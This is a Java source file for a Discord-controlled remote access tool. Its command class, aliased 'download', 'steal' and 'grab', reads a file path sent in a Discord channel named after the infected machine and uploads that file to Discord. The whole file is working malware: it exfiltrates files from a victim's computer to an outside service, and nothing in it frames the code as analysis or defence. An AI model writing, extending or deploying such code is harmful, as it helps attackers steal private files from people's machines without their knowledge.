package me.vasler.command.impl;

import me.vasler.Main;
import me.vasler.command.Command;
import java.awt.Color;
import java.io.File;

import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.MessageEmbed;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.utils.FileUpload;

public class DownloadCommand
extends Command {
    public DownloadCommand() {
        super(new String[]{"download", "steal", "grab"});
    }

    @Override
    public void run(String[] args, TextChannel channel) {
        if (!channel.getName().equalsIgnoreCase(Main.name)) {
            return;
        }
        String filepath = "";
        for (int i = 1; i < args.length; ++i) {
            filepath = i == 1 ? filepath + args[i] : filepath + " " + args[i];
        }
        if (args.length < 2) {
            channel.sendMessage("Invalid usage!").queue();
            return;
        }
        File file = new File(filepath);
        if (file.isDirectory()) {
            channel.sendMessage("That's a folder").queue();
            return;
        }
        if (!file.exists()) {
            channel.sendMessage("File doesn't exist").queue();
            return;
        }
        EmbedBuilder eb = new EmbedBuilder();
        eb.setTitle("Download", null);
        eb.setColor(Color.MAGENTA);
        eb.setDescription("Downloading file from: " + file.getAbsolutePath());
        channel.sendMessageEmbeds(eb.build(), new MessageEmbed[0]).queue();
        channel.sendFiles(new FileUpload[]{FileUpload.fromData(file)}).queue();
    }
}

